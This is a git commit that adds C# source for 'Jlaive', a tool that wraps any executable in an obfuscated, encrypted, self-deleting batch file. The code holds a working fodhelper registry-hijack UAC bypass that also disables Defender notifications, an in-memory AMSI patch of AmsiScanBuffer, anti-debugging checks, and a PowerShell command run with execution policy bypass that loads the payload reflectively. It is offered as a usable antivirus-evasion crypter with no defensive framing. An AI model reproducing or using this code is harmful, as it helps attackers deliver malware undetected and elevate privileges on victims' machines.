12203f46dd447ca099fad0d66536a10dc1ee3598
chash <70506265+ch2sh@users.noreply.github.com>
2022-05-11 21:01:09 +0800

    Add files via upload

---
+++ Jlaive/Form1.cs
@@ -0,0 +1,76 @@
+﻿using System;
+using System.CodeDom.Compiler;
+using System.IO;
+using System.Text;
+using System.Windows.Forms;
+using Microsoft.CSharp;
+
+using static Jlaive.Utils;
+
+namespace Jlaive
+{
+    public partial class Form1 : Form
+    {
+        public Form1()
+        {
+            InitializeComponent();
+        }
+
+        private void button1_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog ofd = new OpenFileDialog();
+            ofd.RestoreDirectory = true;
+            if (ofd.ShowDialog() != DialogResult.OK) return;
+            textBox1.Text = ofd.FileName;
+        }
+
+        private void button2_Click(object sender, EventArgs e)
+        {
+            byte[] pbytes = File.ReadAllBytes(textBox1.Text);
+
+            Random rng = new Random();
+            string stub = StubGen.CreateCS(pbytes, bypassAMSI.Checked, antiDebug.Checked, rng);
+            string tempfile = Path.GetTempFileName();
+            CSharpCodeProvider csc = new CSharpCodeProvider();
+            CompilerParameters parameters = new CompilerParameters(new[] { "mscorlib.dll", "System.Core.dll", "System.dll" }, tempfile)
+            {
+                GenerateExecutable = true,
+                CompilerOptions = "/optimize",
+                IncludeDebugInformation = true
+            };
+            csc.CompileAssemblyFromSource(parameters, stub);
+            byte[] stubbytes = File.ReadAllBytes(tempfile);
+            File.Delete(tempfile);
+
+            string key = RandomString(20, rng);
+            byte[] encrypted = XORCrypt(Compress(stubbytes), key);
+            string command = StubGen.CreatePS(key, rng);
+
+            StringBuilder toobf = new StringBuilder();
+            toobf.AppendLine(@"echo F|xcopy C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe pshell.exe /y");
+            toobf.AppendLine("cls");
+            if (bypassUAC.Checked)
+            {
+                toobf.AppendLine(@"reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /t REG_DWORD /d 0 /f");
+                toobf.AppendLine(@"cmd /c reg add HKCU\Software\Classes\ms-settings\shell\open\command /v DelegateExecute /t REG_SZ /f && reg add HKCU\Software\Classes\ms-settings\shell\open\command /t REG_SZ /d ""%~dp0" + command + @""" /f");
+                toobf.AppendLine("fodhelper");
+                toobf.AppendLine(@"reg delete HKCU\Software\Classes\ms-settings\shell\open\command /f");
+                toobf.AppendLine(@"reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.Defender.SecurityCenter /v Enabled /f");
+            }
+            else toobf.AppendLine(command);
+            toobf.Append("del pshell.exe");
+
+            StringBuilder output = new StringBuilder();
+            output.AppendLine("@echo off");
+            if (obfuscate.Checked) output.Append(Obfuscator.GenCode(toobf.ToString(), rng, 1));
+            else output.AppendLine(toobf.ToString());
+            if (selfDelete.Checked) output.AppendLine("(goto) 2>nul & del \"%~f0\"");
+            output.AppendLine("exit");
+            output.Append(Convert.ToBase64String(encrypted));
+
+            File.WriteAllText($"{AppDomain.CurrentDomain.BaseDirectory}\\{Path.GetFileNameWithoutExtension(textBox1.Text)}_bcrypt.bat", output.ToString(), Encoding.ASCII);
+        }
+
+
+    }
+}
---
+++ Jlaive/StubGen.cs
@@ -0,0 +1,107 @@
+﻿using System;
+using System.Text;
+
+using static Jlaive.Utils;
+
+namespace Jlaive
+{
+    public class StubGen
+    {
+        public static string CreatePS(string xorkey, Random rng)
+        {
+            string varname = RandomString(6, rng);
+            string varname2 = RandomString(6, rng);
+            string srcvarname = RandomString(6, rng);
+            string classname = RandomString(6, rng);
+            string functionname = RandomString(6, rng);
+            string functionname2 = RandomString(6, rng);
+            string srcclass = Convert.ToBase64String(Encoding.UTF8.GetBytes(@"using System.Text;using System.IO;using System.IO.Compression; public class " + classname + @" { public static byte[] " + functionname + @"(byte[] input, string key) { byte[] keyc = Encoding.UTF8.GetBytes(key); for (int i = 0; i < input.Length; i++) { input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]); } return input; } public static byte[] " + functionname2 + @"(byte[] bytes) { MemoryStream msi = new MemoryStream(bytes); MemoryStream mso = new MemoryStream(); var gs = new GZipStream(msi, CompressionMode.Decompress); gs.CopyTo(mso); gs.Dispose(); msi.Dispose(); mso.Dispose(); return mso.ToArray(); } }"));
+            return $"pshell.exe -noprofile -executionpolicy bypass -command ${varname} = (Get-Content -path '%~f0').Split([Environment]::NewLine);${varname2} = ${varname}[${varname}.Length - 1];${srcvarname} = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('{srcclass}'));Add-Type -TypeDefinition ${srcvarname};[System.Reflection.Assembly]::Load([{classname}]::{functionname2}([{classname}]::{functionname}([System.Convert]::FromBase64String(${varname2}), '{xorkey}'))).EntryPoint.Invoke($null, (, [string[]] ('%*')))";
+        }
+
+        public static string CreateCS(byte[] pbytes, bool bamsi, bool antidebug, Random rng)
+        {
+            string namespacename = RandomString(6, rng);
+            string classname = RandomString(6, rng);
+            string functionname = RandomString(6, rng);
+            string functionname2 = RandomString(6, rng);
+            string key = RandomString(20, rng);
+            string encrypted = Convert.ToBase64String(XORCrypt(Compress(pbytes), key));
+            string encrypted2 = Convert.ToBase64String(XORCrypt(Encoding.UTF8.GetBytes("AmsiScanBuffer"), key));
+            return @"using System;
+using System.Diagnostics;
+using System.Text;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.IO;
+using System.IO.Compression;
+
+namespace " + namespacename + @"
+{
+    internal class " + classname + @"
+    {
+        [DllImport(""kernel32.dll"")]
+        static extern IntPtr LoadLibrary(string lpFileName);
+
+        [DllImport(""kernel32.dll"")]
+        static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
+
+        delegate bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
+        delegate bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);
+
+        static string payload = """ + encrypted + @""";
+
+        static void Main(string[] args)
+        {
+            IntPtr kmodule = LoadLibrary(""k"" + ""e"" + ""r"" + ""n"" + ""e"" + ""l"" + ""3"" + ""2"" + ""."" + ""d"" + ""l"" + ""l"");
+
+            " + (antidebug ? 
+@"IntPtr crdpaddr = GetProcAddress(kmodule, ""CheckRemoteDebuggerPresent"");
+CheckRemoteDebuggerPresent CheckRemoteDebuggerPresent = (CheckRemoteDebuggerPresent)Marshal.GetDelegateForFunctionPointer(crdpaddr, typeof(CheckRemoteDebuggerPresent));
+bool isDebuggerPresent = false;
+CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref isDebuggerPresent);
+if (Debugger.IsAttached || isDebuggerPresent) Environment.Exit(1);" : string.Empty) + @"
+
+            " + (bamsi ? 
+            @"IntPtr vpaddr = GetProcAddress(kmodule, ""V"" + ""i"" + ""r"" + ""t"" + ""u"" + ""a"" + ""l"" + ""P"" + ""r"" + ""o"" + ""t"" + ""e"" + ""c"" + ""t"");
+            VirtualProtect VirtualProtect = (VirtualProtect)Marshal.GetDelegateForFunctionPointer(vpaddr, typeof(VirtualProtect));
+            IntPtr amsimodule = LoadLibrary(""a"" + ""m"" + ""s"" + ""i"" + ""."" + ""d"" + ""l"" + ""l"");
+            IntPtr asbaddr = GetProcAddress(amsimodule, Encoding.UTF8.GetString(" + functionname + @"(Convert.FromBase64String(""" + encrypted2 + @"""), """ + key + @""")));
+
+            byte[] patch;
+            if (IntPtr.Size == 8) patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
+            else patch = new byte[] { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };
+            uint old;
+            VirtualProtect(asbaddr, (UIntPtr)patch.Length, 0x40, out old);
+            Marshal.Copy(patch, 0, asbaddr, patch.Length);
+            VirtualProtect(asbaddr, (UIntPtr)patch.Length, old, out old);" : string.Empty) + @"
+
+            Assembly.Load(" + functionname2 + @"(" + functionname + @"(Convert.FromBase64String(payload), """ + key + @"""))).EntryPoint.Invoke(null, new object[] { args[0].Split(' ') });
+        }
+
+        static byte[] " + functionname + @"(byte[] input, string key)
+        {
+            byte[] keyc = Encoding.UTF8.GetBytes(key);
+            for (int i = 0; i < input.Length; i++)
+            {
+                input[i] = (byte)(input[i] ^ keyc[i % keyc.Length]);
+            }
+            return input;
+        }
+
+        static byte[] " + functionname2 + @"(byte[] bytes)
+        {
+            MemoryStream msi = new MemoryStream(bytes);
+            MemoryStream mso = new MemoryStream();
+            GZipStream gs = new GZipStream(msi, CompressionMode.Decompress);
+            gs.CopyTo(mso);
+            gs.Dispose();
+            mso.Dispose();
+            msi.Dispose();
+            return mso.ToArray();
+        }
+    }
+}";
+        }
+    }
+}
